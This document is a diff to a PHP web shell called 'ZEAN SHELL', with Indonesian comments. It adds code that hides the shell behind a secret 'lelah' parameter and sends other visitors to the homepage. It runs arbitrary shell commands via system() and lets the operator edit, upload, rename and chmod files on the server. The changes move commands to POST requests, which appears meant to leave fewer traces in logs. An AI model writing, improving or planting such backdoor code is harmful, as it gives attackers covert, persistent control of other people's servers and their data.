@@ -1,6 +1,6 @@
 <?php
 // Jika parameter "lelah" tidak ada, redirect ke homepage
-if (!isset($_GET['lelah'])) {
+if (!isset($_GET['lelah']) && !isset($_POST['lelah'])) {
     header("Location: /"); // Ganti '/' dengan URL homepage situsmu jika perlu
     exit;
 }
@@ -11,10 +11,15 @@ set_time_limit(0);
 // Path awal saat pertama load (default shell dir)
 $initial_path = realpath(getcwd());
 
-// Ambil path saat ini dari parameter
-$path = isset($_GET['path']) ? realpath($_GET['path']) : $initial_path;
+// Ambil path saat ini dari parameter (GET atau POST)
+$path = null;
+if (isset($_GET['path'])) {
+    $path = realpath($_GET['path']);
+} elseif (isset($_POST['path'])) {
+    $path = realpath($_POST['path']);
+}
 if (!$path || !is_dir($path)) {
-    die("Invalid path.");
+    $path = $initial_path;
 }
 
 // Fungsi untuk mendapatkan user dan group name
@@ -92,20 +97,21 @@ if (isset($_POST['save_file']) && isset($_POST['filename'])) {
     exit;
 }
 
-// Shell command execution
+// Shell command execution (gunakan POST agar aman)
 $output = '';
-if (isset($_GET['cmd'])) {
+if (isset($_POST['cmd'])) {
     chdir($path);
     ob_start();
-    system($_GET['cmd']);
+    system($_POST['cmd']);
     $output = ob_get_clean();
 }
 
-// Ambil info tambahan
-$public_ip = @file_get_contents('https://api.ipify.org') ?: 'Tidak diketahui';
-$domain = $_SERVER['HTTP_HOST'] ?? 'Tidak diketahui';
-$current_user = get_current_user();
-$uname = trim(shell_exec('uname -a'));
+// Informasi tambahan: IP server, domain, user, uname
+$server_ip = gethostbyname(gethostname());
+$remote_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+$server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown';
+$user = get_current_user();
+$uname = php_uname();
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -145,7 +151,7 @@ $uname = trim(shell_exec('uname -a'));
         padding: 10px;
         border-radius: 8px;
     }
-    input, select {
+    input, select, textarea {
         padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px;
         font-family: monospace;
     }
@@ -188,6 +194,12 @@ $uname = trim(shell_exec('uname -a'));
         background-color: #3a3f6b;
         cursor: pointer;
     }
+    #info-box {
+        background: #25284f; color: #9cf; padding: 10px;
+        border-radius: 8px; margin-bottom: 20px;
+        font-size: 14px;
+        line-height: 1.5em;
+    }
 </style>
 <script>
     document.addEventListener("DOMContentLoaded", function() {
@@ -211,15 +223,17 @@ $uname = trim(shell_exec('uname -a'));
 </script>
 </head>
 <body>
-
-<div style="background:#2c2f4a; color:#cfd2dc; font-family: monospace; padding:10px; border-radius:8px; margin-bottom:15px;">
-    <b>IP Publik:</b> <?= htmlspecialchars($public_ip) ?> <br>
-    <b>Domain:</b> <?= htmlspecialchars($domain) ?> <br>
-    <b>User:</b> <?= htmlspecialchars($current_user) ?> <br>
-    <b>Uname -a:</b> <?= htmlspecialchars($uname) ?>
-</div>
-
 <h1>🌐 ZEAN SHELL</h1>
+
+<!-- Info tambahan IP, Domain, User, Uname -->
+<div id="info-box">
+    <b>🖥 Server Info:</b><br>
+    IP Server: <?= htmlspecialchars($server_ip) ?><br>
+    IP Client: <?= htmlspecialchars($remote_ip) ?><br>
+    Domain: <?= htmlspecialchars($server_name) ?><br>
+    User: <?= htmlspecialchars($user) ?><br>
+    Uname: <?= htmlspecialchars($uname) ?><br>
+</div>
 
 <div id="back-button">
     <a href="<?= build_url(['path' => $initial_path]) ?>" style="font-weight:bold; color:#6af;">
@@ -290,12 +304,16 @@ foreach ($all as $file) {
     $ren = "<form method='POST'>
                 <input type='hidden' name='rename_from' value='" . htmlspecialchars($file) . "'>
                 <input type='text' name='rename_to' size='8' placeholder='Rename'>
+                <input type='hidden' name='lelah' value=''>
+                <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
                 <button type='submit' class='mini-btn' title='Rename'>✏️</button>
             </form>";
 
     $chmod = "<form method='POST'>
                 <input type='hidden' name='chmod_file' value='" . htmlspecialchars($file) . "'>
                 <input type='text' name='new_perm' size='4' placeholder='0755'>
+                <input type='hidden' name='lelah' value=''>
+                <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
                 <button type='submit' class='mini-btn' title='Change Permission'>🔒</button>
               </form>";
 
@@ -328,6 +346,8 @@ if (isset($_GET['view'])) {
             <form method='POST'>
                 <input type='hidden' name='filename' value='" . htmlspecialchars($_GET['edit']) . "'>
                 <textarea name='save_file' style='width:100%; height:300px; background:#111; color:#0f0; border:1px solid #555; font-family: monospace;'>$content</textarea><br>
+                <input type='hidden' name='lelah' value=''>
+                <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
                 <input type='submit' value='Simpan Perubahan'>
             </form>
         </div>";
@@ -341,21 +361,28 @@ if (isset($_GET['view'])) {
             <h3>🆕 Buat & Upload</h3>
             <form method="POST" style="margin-bottom:5px;">
                 <input type="text" name="new_file" placeholder="nama_file.txt" required>
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                 <input type="submit" value="Buat File">
             </form>
             <form method="POST" style="margin-bottom:5px;">
                 <input type="text" name="new_folder" placeholder="nama_folder" required>
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                 <input type="submit" value="Buat Folder">
             </form>
             <form method="POST" enctype="multipart/form-data" style="margin-bottom:5px;">
                 <input type="file" name="upload" required>
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                 <input type="submit" value="Upload File">
             </form>
         </div>
         <div id="terminal">
             <h3>💻 Terminal</h3>
-            <form method="GET">
+            <form method="POST">
                 <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+                <input type="hidden" name="lelah" value="">
                 <input type="text" name="cmd" placeholder="Perintah shell..." style="width:90%;">
                 <input type="submit" value="Run">
             </form>
